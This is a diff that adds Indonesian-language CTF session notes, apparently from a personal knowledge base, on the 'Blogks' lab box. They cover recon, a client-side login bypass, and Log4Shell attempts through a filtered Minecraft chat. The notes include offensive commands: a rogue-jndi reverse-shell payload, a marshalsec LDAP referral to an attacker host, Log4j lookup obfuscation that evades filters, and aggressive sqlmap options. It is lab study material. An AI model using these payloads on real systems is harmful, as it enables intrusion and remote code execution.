@@ -6074,5 +6074,397 @@
     ],
     "summary": "Timpa BankApp.exe dengan payload benign yang dijalankan watchdog sebagai Astaroth, lalu lewati jebakan ACL DENY dengan menyalin root.txt keluar sebagai Astaroth. Root flag diperoleh, box selesai.",
     "url": ""
+  },
+  {
+    "id": "hacktrace-blogks-recon-js-deobf",
+    "date": "2026-07-16",
+    "title": "Blogks — Recon & Client-Side Deobfuscation ke Minecraft Control Panel (Hard, Hacktrace)",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive Security",
+    "tags": [
+      "recon",
+      "javascript-deobfuscation",
+      "client-side-authz-bypass",
+      "content-discovery",
+      "version-fingerprinting",
+      "minecraft",
+      "log4shell",
+      "linux",
+      "hard",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "Content discovery: feroxbuster menemukan /script.js dan /index.php di balik login form Apache",
+      "JavaScript deobfuscation: script.js gaya obfuscator.io dibalik untuk membaca alur login() sebenarnya",
+      "Client-side authorization bypass: JS hanya cek HTTP status 200 dari /login.php lalu redirect ke halaman tersembunyi 828cn37d_924_71213.php — otorisasi terjadi di klien",
+      "Version fingerprinting: panel tersembunyi = Minecraft Control Panel; server Java Edition 1.16.5 dengan offline/demo join, mengarah ke CVE-2021-44228",
+      "Mapping attack surface: dari web login sampai control panel yang mengontrol server Minecraft"
+    ],
+    "terms": [
+      "nmap",
+      "feroxbuster",
+      "obfuscator.io",
+      "login.php",
+      "Uname",
+      "Pass",
+      "828cn37d_924_71213.php",
+      "Minecraft Java Edition 1.16.5",
+      "Log4Shell",
+      "CVE-2021-44228"
+    ],
+    "commands": [
+      "nmap -sVC --min-rate 1000 -p- -Pn -T4 -oN nmap-blogks.log blogks.htr",
+      "feroxbuster -u http://blogks.htr -x php,js,txt",
+      "curl -s http://blogks.htr/script.js | js-beautify"
+    ],
+    "problems": [
+      "script.js di-obfuscate gaya obfuscator.io sehingga alur login harus direkonstruksi manual dari hasil deobfuscation",
+      "Halaman panel disembunyikan di balik nama acak (828cn37d_924_71213.php) dan hanya di-gate oleh cek status 200 sisi klien"
+    ],
+    "summary": "Sesi awal Blogks (Hacktrace Ranges, Linux, Hard, in progress). nmap membuka OpenSSH 8.2p1 (22) dan Apache 2.4.41 (80) dengan http-title Login Form. feroxbuster menemukan /script.js dan /index.php; script.js yang di-obfuscate gaya obfuscator.io dibalik dan mengungkap fungsi login() yang POST ke /login.php (parameter Uname & Pass) lalu redirect sisi klien ke halaman tersembunyi 828cn37d_924_71213.php hanya berdasarkan HTTP status 200 — otorisasi murni di klien. Halaman itu adalah Minecraft Control Panel (Start/Stop/Check Status). Fingerprint: Minecraft Java Edition 1.16.5 dengan offline/demo join diizinkan, mengarah ke dugaan Log4Shell (CVE-2021-44228). Foothold belum tercapai.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-blogks-service-troubleshoot",
+    "date": "2026-07-17",
+    "title": "Blogks — Troubleshooting Service Lab: Panel Start Tidak Membangunkan Server Minecraft (Hard, Hacktrace)",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive Security",
+    "tags": [
+      "lab-troubleshooting",
+      "service-state",
+      "port-polling",
+      "revert",
+      "minecraft",
+      "linux",
+      "hard",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "Membedakan bug aplikasi vs state lab yang rusak: gejala sama (25565 tidak terbuka) bisa berasal dari dua akar yang berbeda",
+      "Verifikasi hipotesis lewat polling port: full nmap berulang sebagai satu-satunya arbiter apakah server benar-benar boot",
+      "Eliminasi session-gating: panel tidak menyetel cookie sama sekali, jadi kegagalan bukan karena request tak terautentikasi",
+      "Kapan revert adalah langkah yang benar: jumlah revert lab yang tinggi = sinyal service memang rapuh, bukan kesalahan pemakai"
+    ],
+    "terms": [
+      "nmap",
+      "curl",
+      "DevTools",
+      "revert",
+      "port 25565",
+      "Minecraft Control Panel"
+    ],
+    "commands": [
+      "nmap -p- -Pn -T4 blogks.htr",
+      "curl -s -X POST http://blogks.htr/828cn37d_924_71213.php -d 'action=start'",
+      "for i in $(seq 1 12); do nmap -p25565 -Pn blogks.htr; sleep 30; done"
+    ],
+    "problems": [
+      "Tombol Start di panel tidak membuka port 25565; full nmap tetap hanya memperlihatkan 22/80 selama polling ~6 menit",
+      "Dua jalur diuji (curl langsung dan browser asli dengan header lengkap), dua-duanya gagal — sempat mengaburkan apakah ini bug app atau state rusak",
+      "Panel tidak menyetel cookie apa pun sehingga hipotesis session-gating gugur"
+    ],
+    "summary": "Investigasi Blogks (Hacktrace Ranges, Hard, in progress): panel Minecraft Control Panel menekan Start tapi port 25565 tidak pernah terbuka; full nmap tetap hanya 22/80. Dua jalur trigger diuji (curl langsung dan browser asli berheader lengkap) dengan polling port ~6 menit, dua-duanya gagal. Panel tidak menyetel cookie sama sekali sehingga kegagalan bukan karena session-gating. Jumlah revert mesin yang tinggi jadi sinyal service-nya rapuh; setelah revert, server Minecraft boot bersih dan 25565 terbuka. Kesimpulan sesi: ini state lab yang rusak, bukan bug aplikasi — revert adalah solusinya.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-blogks-jndi-chat-filter-bypass",
+    "date": "2026-07-18",
+    "title": "Blogks — Setup Infrastruktur JNDI & Bypass Filter Chat Minecraft (Hard, Hacktrace)",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive Security",
+    "tags": [
+      "log4shell",
+      "jndi",
+      "ldap",
+      "filter-evasion",
+      "log4j-lookup-nesting",
+      "trigger-automation",
+      "minecraft",
+      "linux",
+      "hard",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "Log4j lookup nesting: obfuscasi ${lower:} dan tokenisasi ${::-x} agar Log4j merekonstruksi string yang filter tidak lihat",
+      "Filter evasion bertahap: ChatManager punya keyword filter dan anti-advertising filter (pola IP dan ://) yang harus dilewati satu per satu",
+      "Membedakan lolos filter vs ter-resolve: pesan yang di-broadcast bukan bukti Log4j memanggil lookup — dua peristiwa berbeda",
+      "Trigger automation: bot mineflayer (offline-mode, 1.16.5) untuk menembak payload lewat chat secara terotomasi",
+      "Jalur command buntu: /${jndi...} dihapus slash-nya oleh server dan tetap difilter ChatManager"
+    ],
+    "terms": [
+      "JNDIExploit",
+      "mineflayer",
+      "pwncat",
+      "ChatManager",
+      "tcpdump",
+      "${lower:}",
+      "${::-x}",
+      "LDAP 1389",
+      "HTTP 8888"
+    ],
+    "commands": [
+      "java -jar JNDIExploit.jar -i <attacker-ip> -l 1389 -p 8888",
+      "pwncat-cs -lp 4444",
+      "node blogks-bot.js   # mineflayer offline-mode 1.16.5",
+      "tcpdump -ni tun0 host <target-ip>"
+    ],
+    "problems": [
+      "ChatManager memblok payload plain lewat keyword filter (\"That word is not allowed\") dan anti-advertising filter yang mendeteksi pola IP/://",
+      "Jalur command (/${jndi...}) buntu: slash dihapus server dan command juga difilter",
+      "Bahaya kesimpulan salah: broadcast pesan yang lolos filter mudah disalahartikan sebagai bukti Log4j me-resolve lookup"
+    ],
+    "summary": "Sesi Blogks (Hacktrace Ranges, Hard, in progress): setup infrastruktur Log4Shell — JNDIExploit (LDAP 1389 + HTTP 8888) dan listener pwncat 4444, plus bot mineflayer (Node, offline-mode 1.16.5) sebagai mekanisme trigger chat otomatis. Server memakai plugin ChatManager dengan keyword filter dan anti-advertising filter (pola IP dan ://). Bypass dibangun bertahap: ${lower:} lolos keyword tapi kena anti-advertising, lalu tokenisasi penuh titik/titik-dua/slash pakai ${::-x} agar ChatManager tidak melihat IP/URL sementara Log4j tetap bisa merekonstruksi string. Jalur command buntu karena slash dihapus dan tetap difilter. Catatan disiplin: pesan yang di-broadcast bukan bukti Log4j me-resolve lookup — belum ada callback.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-blogks-java8-tooling-methodology",
+    "date": "2026-07-18",
+    "title": "Blogks — Kegagalan Tooling Era Java 8 di JDK Modern & Koreksi Metodologi (Hard, Hacktrace)",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive Security",
+    "tags": [
+      "log4shell",
+      "jndi",
+      "jpms-module-encapsulation",
+      "java8",
+      "methodology",
+      "evidence-discipline",
+      "tcpdump",
+      "linux",
+      "hard",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "JPMS module encapsulation: tool era Java 8 crash di JDK modern karena package internal (xalan) tidak di-export oleh module java.xml",
+      "Jalankan tool era Java 8 di bawah runtime yang benar (Temurin 8) alih-alih JDK sistem, bukan menambal error secara membabi buta",
+      "Disiplin observasi dan urutan bukti: screenshot output selalu diambil sebelum bot menembak sehingga kondisi setelah tembakan tak pernah diamati",
+      "tcpdump yang dibaca setelah tembakan dijadikan arbiter tunggal yang tahan masalah timestamp",
+      "Menghindari kesimpulan dari data basi: cache-buster (suffix acak di path LDAP) justru merusak route matching, bukan menyelesaikan masalah"
+    ],
+    "terms": [
+      "Temurin 8",
+      "8u492",
+      "IllegalAccessError",
+      "java.xml module",
+      "xalan",
+      "JNDIExploit",
+      "tcpdump",
+      "route matching"
+    ],
+    "commands": [
+      "/opt/temurin8/bin/java -jar JNDIExploit.jar -i <attacker-ip> -l 1389 -p 8888",
+      "update-alternatives --config java",
+      "tcpdump -ni tun0 host <target-ip> -w after-shot.pcap"
+    ],
+    "problems": [
+      "JNDIExploit crash saat menyajikan payload dengan java.lang.IllegalAccessError karena module encapsulation JDK modern",
+      "Percobaan cache-buster (suffix acak ke path LDAP) merusak route matching tool, sedangkan caching Log4j memang bukan blocker",
+      "Bug metodologi sendiri: output tool selalu di-screenshot sebelum bot menembak sehingga kondisi pasca-tembakan tidak pernah benar-benar diamati"
+    ],
+    "summary": "Sesi Blogks (Hacktrace Ranges, Hard, in progress): JNDIExploit crash dengan java.lang.IllegalAccessError saat menyajikan payload — module java.xml pada JDK modern tidak meng-export package internal xalan (JPMS module encapsulation), karena tool era Java 8 dijalankan di JDK sistem. Diperbaiki dengan menjalankan tool di bawah Temurin 8 (8u492) yang di-install terpisah. Percobaan cache-buster terbukti keliru: menambah suffix acak ke path LDAP malah merusak route matching tool, sementara caching Log4j bukan blocker. Ditemukan pula bug metodologi sendiri — screenshot output tool selalu diambil sebelum bot menembak, jadi kondisi pasca-tembakan tak pernah diamati; diperbaiki dengan menjadikan tcpdump yang dibaca setelah tembakan sebagai arbiter tunggal. Belum ada callback.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-blogks-rogue-jndi-classpath-gadget",
+    "date": "2026-07-22",
+    "title": "Blogks — Pivot ke rogue-jndi & Pendekatan Classpath Gadget (Hard, Hacktrace)",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive Security",
+    "tags": [
+      "log4shell",
+      "jndi",
+      "rogue-jndi",
+      "classpath-gadget",
+      "trusturlcodebase",
+      "maven",
+      "minecraft",
+      "linux",
+      "hard",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "Classpath gadget vs remote codebase: rogue-jndi memanfaatkan gadget yang sudah ada di classpath target sehingga tidak butuh remote .class dan bisa jalan di JRE modern",
+      "trustURLCodebase: mitigasi Log4j versi baru memblok remote codebase, mendorong pendekatan gadget lokal (o=tomcat, o=groovy)",
+      "Adaptasi payload ke tooling baru: obfuscation ChatManager yang sudah terbukti perlu di-retarget ke path rogue-jndi",
+      "Build dari source: rogue-jndi (veracode-research) dikompilasi via mvn package"
+    ],
+    "terms": [
+      "rogue-jndi",
+      "maven",
+      "mvn package",
+      "o=tomcat",
+      "o=groovy",
+      "trustURLCodebase",
+      "Paper 1.16.5",
+      "base64 reverse shell",
+      "ChatManager"
+    ],
+    "commands": [
+      "git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package",
+      "java -jar target/RogueJndi-1.1.jar --command \"bash -c {echo,<base64-revshell>}|{base64,-d}|bash\" --hostname <attacker-ip>",
+      "curl -s -X POST http://blogks.htr/828cn37d_924_71213.php -d 'action=start'"
+    ],
+    "problems": [
+      "Payload plain langsung diblok ChatManager, jadi obfuscation ${::-x} yang sudah terbukti harus di-retarget ke path rogue-jndi",
+      "Perlu memastikan gadget yang ada di classpath target (tomcat/groovy) benar-benar cocok agar tidak bergantung pada remote codebase yang diblok"
+    ],
+    "summary": "Sesi Blogks (Hacktrace Ranges, Hard, in progress): beralih dari JNDIExploit ke rogue-jndi (veracode-research), di-build via mvn package, untuk pendekatan classpath gadget yang tidak butuh remote codebase (relevan karena trustURLCodebase diblok di Log4j baru) dan bisa jalan di JRE modern. RogueJndi dijalankan dengan payload command reverse shell base64 dan hostname attacker; mapping o=tomcat dan o=groovy terkonfirmasi. Server Minecraft distart lewat panel via curl dan 25565 terkonfirmasi terbuka. Payload plain langsung diblok ChatManager, jadi obfuscation yang sudah terbukti perlu di-retarget ke path rogue-jndi. Callback belum diperoleh.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-blogks-vpn-return-path-injection-points",
+    "date": "2026-07-24",
+    "title": "Blogks — Root Cause Jaringan: Tunnel OpenVPN Ganda & Enumerasi Titik Injeksi (Hard, Hacktrace)",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive Security",
+    "tags": [
+      "log4shell",
+      "openvpn",
+      "return-path-routing",
+      "injection-point-enumeration",
+      "ldap-referral",
+      "marshalsec",
+      "minecraft",
+      "linux",
+      "hard",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "Routing return path & interface ganda: dua interface tun memegang IP VPN yang sama membuat return path ambigu — outbound jalan tapi callback masuk hilang",
+      "Perbaikan bersih: pkill openvpn lalu satu invocation daemonized untuk menghilangkan tun kembar",
+      "Enumerasi titik injeksi sistematis: chat, username login (dibatasi 16 char oleh protokol MC), field hostname saat handshake, dan server list ping",
+      "Referral LDAP dua tahap: hint komunitas mengarah ke rantai LDAP referral -> HTTP yang menyajikan .class (bukan gadget serialized), sehingga arah berubah ke marshalsec"
+    ],
+    "terms": [
+      "OpenVPN",
+      "tun0",
+      "tun1",
+      "pkill openvpn",
+      "tcpdump",
+      "marshalsec",
+      "LDAPRefServer",
+      "protocol field injection",
+      "16-char username limit"
+    ],
+    "commands": [
+      "ip addr show | grep -E 'tun[0-9]'",
+      "pkill openvpn; openvpn --config lab.ovpn --daemon",
+      "tcpdump -ni tun0 host <target-ip>",
+      "nmap -sn <lab-gateway>"
+    ],
+    "problems": [
+      "Dua interface tun (tun0 dan tun1) memegang IP VPN yang sama karena OpenVPN dijalankan dua kali — return path ambigu sehingga callback masuk hilang meski outbound jalan",
+      "Username login dibatasi 16 karakter oleh protokol Minecraft sehingga payload tidak muat di vektor itu",
+      "Setelah perbaikan VPN, tcpdump menunjukkan nol paket inisiasi dari target di semua vektor (chat, username, hostname handshake, server list ping)"
+    ],
+    "summary": "Sesi Blogks (Hacktrace Ranges, Hard, in progress): ditemukan root cause jaringan — dua interface tun (tun0 & tun1) memegang IP VPN yang sama karena OpenVPN jalan dua kali, membuat return path ambigu; outbound jalan (bisa start & join server) tapi callback masuk hilang. Diperbaiki dengan pkill openvpn lalu satu invocation daemonized. Setelah bersih, semua titik injeksi diuji satu per satu: chat, username saat login (dibatasi 16 char oleh protokol MC sehingga payload tak muat), field hostname saat handshake, dan server list ping — tcpdump menunjukkan nol paket inisiasi dari target di semua vektor. Hint komunitas mengarah ke rantai dua tahap LDAP referral -> HTTP yang menyajikan .class (bukan gadget serialized), sehingga arah berikutnya berpindah ke marshalsec. Foothold belum tercapai.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-blogks-log4shell-chat-falsification",
+    "date": "2026-07-28",
+    "title": "Blogks — Falsifikasi Vektor Chat Log4Shell lewat Pengukuran Terkontrol (Hard, Hacktrace)",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive Security",
+    "tags": [
+      "log4shell",
+      "marshalsec",
+      "hypothesis-falsification",
+      "measurement-design",
+      "dns-canary",
+      "egress-testing",
+      "minecraft",
+      "linux",
+      "hard",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "Falsifikasi hipotesis: rancang pengukuran untuk membuktikan vektor chat SALAH, bukan sekadar mencoba lagi",
+      "Desain pengukuran: tcpdump filter sempit vs lebar (tangkap port apa pun) untuk memisahkan payload gagal vs target tidak sampai ke logger rentan",
+      "Canary DNS sebagai tes egress: DNS adalah port egress paling mungkin diizinkan — nol callback DNS menggugurkan hipotesis egress filtering",
+      "Membedakan payload gagal vs target tidak rentan: payload dan obfuscation selalu benar, tapi jalur chat tidak pernah sampai ke pemanggilan logger yang rentan",
+      "marshalsec dua tahap: LDAP referral dipasangkan HTTP server sederhana untuk menyajikan .class tahap kedua"
+    ],
+    "terms": [
+      "marshalsec",
+      "tcpdump",
+      "DNS canary",
+      "nmap -p-",
+      "RCON",
+      "Temurin 8",
+      "message lookup",
+      "egress filtering"
+    ],
+    "commands": [
+      "java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://<attacker-ip>:8000/#Exploit'",
+      "python3 -m http.server 8000",
+      "tcpdump -ni tun0 host <target-ip>            # filter sempit",
+      "tcpdump -ni tun0 'src <target-ip>'            # filter lebar, port apa pun",
+      "nmap -p- -Pn -T4 blogks.htr"
+    ],
+    "problems": [
+      "Mesin sempat mati beberapa hari (host unreachable meski gateway lab hidup), dipulihkan lewat revert; VPN dibersihkan ke satu tunnel",
+      "Tiga tembakan terkontrol (tokenisasi penuh + tcpdump sempit, hybrid kanonik yang langsung diblok filter, tokenisasi penuh + tcpdump lebar) semuanya nol callback",
+      "Canary DNS juga nol padahal DNS adalah egress paling mungkin diizinkan — hipotesis egress filtering ikut gugur"
+    ],
+    "summary": "Sesi Blogks (Hacktrace Ranges, Hard, in progress): vektor chat Log4Shell difalsifikasi lewat pengukuran terkontrol. Mesin sempat mati beberapa hari dan dipulihkan via revert; VPN dibersihkan ke satu tunnel. marshalsec di-clone dan build sukses di bawah Temurin 8, dipasangkan HTTP server sederhana untuk tahap kedua. Tiga tembakan terkontrol dilakukan: payload tokenisasi penuh (lolos filter, di-broadcast) dengan tcpdump sempit, lalu bentuk hybrid kanonik (langsung diblok filter), lalu tokenisasi penuh dengan tcpdump lebar yang menangkap port apa pun — semua nol callback. Canary DNS juga nol, padahal DNS adalah egress paling mungkin diizinkan, sehingga hipotesis egress filtering ikut gugur. Kesimpulan: message lookup pada jalur chat tidak aktif di server ini — payload/obfuscation selalu benar, targetnya yang tidak pernah sampai ke pemanggilan logger rentan. Full port scan hanya 22, 80, 25565, tanpa RCON. Vektor chat ditutup.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-blogks-web-pivot-403-reframe",
+    "date": "2026-07-28",
+    "title": "Blogks — Pivot Balik ke Sisi Web & Reframing Respons 403 (Hard, Hacktrace)",
+    "platform": "Hacktrace Ranges",
+    "category": "Offensive Security",
+    "tags": [
+      "web",
+      "sql-injection",
+      "sqlmap",
+      "php-input",
+      "boolean-based-detection",
+      "assumption-reframe",
+      "attack-surface-reselection",
+      "linux",
+      "hard",
+      "ctf",
+      "hacktrace"
+    ],
+    "concepts": [
+      "Disiplin memilih ulang permukaan serangan: setelah vektor chat gugur, web port 80 yang selama ini hanya dilewati dijadikan target utama",
+      "php://input vs $_POST: body form Uname=x&Pass=y dikirim sebagai Content-Type: text/plain, artinya server membaca php://input mentah bukan $_POST",
+      "Membaca ulang asumsi yang salah: 403 dari login.php ternyata respons 'login gagal', bukan filter header — browser pun menerima 403 dan JS hanya redirect kalau status 200",
+      "Boolean-based detection tanpa perbedaan body: body sukses dan gagal sama-sama kosong, jadi satu-satunya sinyal true/false adalah HTTP status",
+      "Menjaga content-type asli: request dikirim dari file request agar text/plain terjaga saat eskalasi ke sqlmap"
+    ],
+    "terms": [
+      "curl",
+      "DevTools",
+      "sqlmap",
+      "SQL injection",
+      "php://input",
+      "$_POST",
+      "Content-Type: text/plain",
+      "login.php",
+      "HTTP 403"
+    ],
+    "commands": [
+      "curl -s -i http://blogks.htr/login.php -H 'Content-Type: text/plain' --data-binary 'Uname=admin&Pass=test'",
+      "sqlmap -r login.req --technique=B --string-not '' --code 200 --level 5 --risk 3 --batch"
+    ],
+    "problems": [
+      "Waktu sempat terbuang mengejar 'filter header' yang tidak ada: 403 dari login.php ternyata hanya respons login gagal, artinya semua request sebelumnya sudah sampai ke logika login",
+      "Percobaan SQLi auth bypass manual tetap 403 sehingga dieskalasi ke sqlmap",
+      "Body sukses dan gagal sama-sama kosong, sehingga satu-satunya sinyal boolean adalah HTTP status; request harus dikirim dari file agar Content-Type text/plain asli terjaga"
+    ],
+    "summary": "Sesi Blogks (Hacktrace Ranges, Hard, in progress): setelah vektor chat Log4Shell gugur, satu-satunya permukaan tersisa adalah web port 80 yang selama ini hanya dilewati. DevTools mengungkap request login asli: body bergaya form Uname=x&Pass=y tapi dikirim sebagai Content-Type: text/plain, artinya server membaca php://input mentah, bukan $_POST. Reframing kunci: 403 dari login.php ternyata bukan filter header melainkan respons 'login gagal' itu sendiri — browser pun menerima 403 dan JS hanya redirect ke panel kalau status 200, jadi semua request sebelumnya sudah sampai ke logika login dan waktu sempat terbuang mengejar filter yang tidak ada. SQLi auth bypass manual tetap 403 sehingga dieskalasi ke sqlmap; kendalanya body sukses dan gagal sama-sama kosong sehingga satu-satunya sinyal true/false adalah HTTP status, dan request harus dikirim dari file agar content-type asli terjaga. Investigasi web berlanjut; belum ada bypass.",
+    "url": ""
   }
 ]
